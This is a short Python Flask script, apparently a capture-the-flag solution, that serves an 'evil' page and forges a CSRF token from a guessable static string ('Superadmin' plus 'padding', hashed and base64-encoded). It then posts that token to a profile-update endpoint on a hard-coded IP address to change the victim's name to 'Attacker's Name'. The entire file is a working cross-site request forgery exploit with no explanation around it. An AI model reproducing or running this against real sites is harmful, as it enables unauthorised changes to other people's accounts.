import base64
import hashlib
from flask import Flask, render_template
import requests

app = Flask(__name__, static_url_path='/static', static_folder='static')
app.config['DEBUG'] = True

# Function to update the profile on the original site
def update_profile(new_name, csrf_token):
    update_url = "http://34.38.142.16:4444/profile/update"
    payload = {'name': new_name, 'csrf_token': csrf_token}
    response = requests.post(update_url, data=payload)
    return response

@app.route("/")
def start():
    # Generate a CSRF token based on a static IV
    iv = "padding"
    csrf = "Superadmin" + iv
    csrf_hash = hashlib.sha256(csrf.encode()).hexdigest()
    csrf_token = base64.b64encode(csrf_hash.encode()).decode('utf-8')
    
    # Update the profile on the original site
    new_name = "Attacker's Name"
    update_profile(new_name, csrf_token)
    
    # Render the HTML template with the CSRF token
    return render_template("evil_csrf2.html", csrf_token=csrf_token)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)

